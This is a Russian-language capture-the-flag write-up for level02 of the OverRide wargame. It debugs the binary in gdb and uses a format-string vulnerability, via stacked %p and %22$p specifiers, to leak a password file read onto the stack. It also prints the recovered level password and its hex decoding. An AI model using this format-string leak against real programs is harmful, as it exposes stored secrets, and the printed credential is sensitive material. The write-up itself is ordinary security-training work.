Чтобы проследить ход выполнения программы, создадим файл:

python -c “print ‘A’*40 ” > /tmp/test
(Длина данных в программе равна длине обычного пароля 40 байт.
Необходимо, чтобы пройти проверку

0x0000000000400925 <+273>:	cmpl   	$0x29,-0xc(%rbp)
0x0000000000400929 <+277>:	je     		0x40097d <main+361>

В отладчике установим аргумент:
(gdb) set args arg1 /tmp/test

Установим брейкпоинт перед вызовом fopen, чтобы подменить значение регистра.
По умолчанию будем пытаться открыть файл /home/users/level03/.pass, нам нужно подменить на свой.

0x00000000004008a5 <+145>:	mov    %rax,%rdi
(gdb) b *0x00000000004008a5
(gdb) r
(gdb) set $rax=0x7fffffffe8bd (Адрес плавающий, может меняться)

После fopen вызывается read, который считает открытый ранее файл и запишет в стек

Далее происходят 2 вызова fgets, один из которых запрашивает у пользователя логин,
После чего он запишется по адресу (адрес, который находится в регистре rax перед вызовом функции):

(gdb) x 0x7fffffffe510
0x7fffffffe510:	 "AAAAAAAA"

Второй вызов fgets запрашиает пароль и сохраняет по адресу:
(gdb) x 0x7fffffffe470
0x7fffffffe470:	 "BBBBBBBB\n"

Можно заметить, что в стеке между адресом, где лежит логин и где лежит введенный пароль, находится считанный пароль из файла
(gdb) x/1000s 0x7fffffffe470
0x7fffffffe470:	 "BBBBBBBB\n"
0x7fffffffe47a:	 ""
…
…
0x7fffffffe4df:	 ""
0x7fffffffe4e0:	 'A' <repeats 40 times>
0x7fffffffe509:	 ""
0x7fffffffe50a:	 ""
0x7fffffffe50b:	 ""
0x7fffffffe50c:	 ""
0x7fffffffe50d:	 ""
0x7fffffffe50e:	 ""
0x7fffffffe50f:	 ""
0x7fffffffe510:	 "AAAAAAAA"

Чтобы его распечатать можно воспользоваться уязвимостью форматной строки,
так как далее происходит вызов printf, который выведет логин.

Подавая нужное кол-во спецификаторов %p можно начать выводить данные из стека, в том числе пароль из файла.

В дебагере пробуем подать логин 40 %p, чтобы определить смещение:

CCCCCCCC%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%

В итоге получаем строку:

--[ Password: *****************************************
CCCCCCCC0x7fffffffe470(nil)0x200x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6680x3f7ff9a080x20202020202020200x2020(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x41414141414141410x41414141414141410x41414141414141410x41414141414141410x4141414141414141(nil)0x43434343434343430x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x20202020202020250x2900202020 does not have access!

Что позволяет определить с какого аргумента нужно выводить - 22.

level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password: 123
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!

Далее используем скрипт для конвертации пароля в нужный вид.

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H


PS: хак для подстановки строк "на лету" (дебаг):
gdb) p malloc(20)
$1 = 6299728
(gdb) p strcpy($1, "/tmp/tst02")
$3 = 6299728
(gdb) x/s $1
0x602050:        "/tmp/tst02"
(gdb) set $rax = 0x602050
(gdb) x/s $rax
0x602050:        "/tmp/tst02"

Другой вариант расшифровки:
echo -e '\x48\x33\x67\x50\x66\x4b\x39\x4d\x35\x4a\x35\x68\x6e\x47\x58\x73\x37\x7a\x71\x43\x57\x4e\x67\x58\x45\x41\x4a\x35\x61\x73\x39\x51\x75\x6e\x50\x52\x34\x37\x68\x48' | rev
